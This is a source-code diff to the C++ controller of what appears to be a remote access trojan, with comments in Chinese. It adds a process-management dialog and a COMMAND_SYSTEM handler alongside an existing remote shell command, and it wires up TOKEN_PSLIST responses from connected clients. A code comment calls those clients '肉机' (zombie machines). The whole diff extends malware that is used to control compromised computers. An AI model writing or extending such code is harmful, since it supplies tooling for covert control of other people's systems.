@@ -14,6 +14,7 @@
 #include "Others/macros.h"
 #include "Others/login.h"
 #include "CShellDlg.h"
+#include "CSystemDlg.h"
 
 //using namespace std;
 
@@ -325,11 +326,13 @@ BEGIN_MESSAGE_MAP(CUIDlg, CDialogEx)
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd:: *)(WPARAM, LPARAM)) &CUIDlg::OnIconNotify)
 	ON_MESSAGE(WM_ADDONLINE, &CUIDlg::OnAddOnline)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, &CUIDlg::OnOpenShellDlg)
+	ON_MESSAGE(WM_OPENPSLISTDIALOG, &CUIDlg::OnOpenSystemDialog)
 
 	ON_COMMAND(ID_MAIN_SETTING, &CUIDlg::OnMainSetting)
 	ON_COMMAND(ID_MIAN_CLOSE, &CUIDlg::OnMianClose)
 	ON_NOTIFY(NM_RCLICK, IDC_LIST_ONLINE, &CUIDlg::OnNMRClickListOnline)
 	ON_COMMAND(ID_ONLINE_CMD, &CUIDlg::OnOnlineCmd)
+	ON_COMMAND(IDM_PROCESS, &CUIDlg::OnProcess)
 END_MESSAGE_MAP()
 
 
@@ -413,6 +416,7 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 	}
 
 	//如果没有赋值就判断是否是上线包和打开功能功能窗口
+	// 收到肉机响应的指令
 	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
 		// 要求验证
 	case TOKEN_AUTH:
@@ -466,11 +470,10 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 
 	case TOKEN_PSLIST:
-		//g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+		g_UIDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
 		break;
 
 	case TOKEN_SHELL_START:
-		// 收到肉机响应的指令
 		g_UIDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
 		break;
 		// 命令停止当前操作
@@ -807,6 +810,21 @@ LRESULT CUIDlg::OnOpenShellDlg(WPARAM wParam, LPARAM lParam)
 	return LRESULT();
 }
 
+LRESULT CUIDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext *pContext = (ClientContext *)lParam;
+	CSystemDlg *dlg = new CSystemDlg(this, g_iocpServer, pContext);
+
+	// 非模态方式打开
+	dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SYSTEM_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+
+	return LRESULT();
+}
+
 
 // 参数设置
 void CUIDlg::OnMainSetting()
@@ -852,5 +870,13 @@ void CUIDlg::OnNMRClickListOnline(NMHDR *pNMHDR, LRESULT *pResult)
 void CUIDlg::OnOnlineCmd()
 {
 	BYTE bToken = COMMAND_SHELL;
+	SendSelectedToken(&bToken, sizeof(BYTE));
+}
+
+
+// 进程管理
+void CUIDlg::OnProcess()
+{
+	BYTE bToken = COMMAND_SYSTEM;
 	SendSelectedToken(&bToken, sizeof(BYTE));
 }
